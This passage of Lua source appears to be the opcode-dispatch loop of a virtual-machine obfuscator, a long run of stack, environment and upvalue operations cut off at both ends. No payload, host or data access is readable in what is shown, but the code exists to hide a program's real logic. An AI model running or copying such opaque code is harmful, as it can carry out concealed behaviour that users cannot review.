;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];B=Inst[3];K=Stk[B];for Idx=B + 1 ,Inst[4] do K=K   .. Stk[Idx] ;end Stk[Inst[2]]=K;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];B=Inst[3];K=Stk[B];for Idx=B + 1 ,Inst[4] do K=K   .. Stk[Idx] ;end Stk[Inst[2]]=K;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];B=Inst[3];K=Stk[B];for Idx=B + 1 ,Inst[4] do K=K   .. Stk[Idx] ;end Stk[Inst[2]]=K;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};end elseif (Enum<=233) then local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]~=Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end elseif (Enum==234) then Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};else local A;A=Inst[2];Stk[A]=Stk[A]();VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];if Stk[Inst[2]] then VIP=VIP + 1 ;else VIP=Inst[3];end end elseif (Enum<=274) then if (Enum<=254) then if (Enum<=244) then if (Enum<=239) then if (Enum<=237) then if (Enum>236) then local B;local A;Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));else local B;local A;A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];end elseif (Enum==238) then local B;local A;A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);else local B;local A;Stk[Inst[2]]=Stk[Inst[3]] + Stk[Inst[4]] ;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] + Stk[Inst[4]] ;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] + Stk[Inst[4]] ;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];end elseif (Enum<=241) then if (Enum>240) then local B;local A;Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local B;local A;Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];end elseif (Enum<=242) then if (Inst[2]<=Stk[Inst[4]]) then VIP=VIP + 1 ;else VIP=Inst[3];end elseif (Enum>243) then local B;local A;Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]~=Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end end elseif (Enum<=249) then if (Enum<=246) then if (Enum>245) then local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));else local A;A=Inst[2];Stk[A]=Stk[A]();VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];if Stk[Inst[2]] then VIP=VIP + 1 ;else VIP=Inst[3];end end elseif (Enum<=247) then local A;Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];elseif (Enum==248) then local K;local B;local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];B=Inst[3];K=Stk[B];for Idx=B + 1 ,Inst[4] do K=K   .. Stk[Idx] ;end Stk[Inst[2]]=K;VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local B;local T;local A;A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];T=Stk[A];B=Inst[3];for Idx=1,B do T[Idx]=Stk[A + Idx ];end end elseif (Enum<=251) then if (Enum>250) then local A;Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];else local B;local A;Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);end elseif (Enum<=252) then local Edx;local Results,Limit;local B;local A;Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Unpack(Stk,A + 1 ,Inst[3])));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];elseif (Enum>253) then local Edx;local Results,Limit;local B;local A;A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Unpack(Stk,A + 1 ,Inst[3])));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Unpack(Stk,A + 1 ,Inst[3])));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local Results;local Edx;local Results,Limit;local B;local A;Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 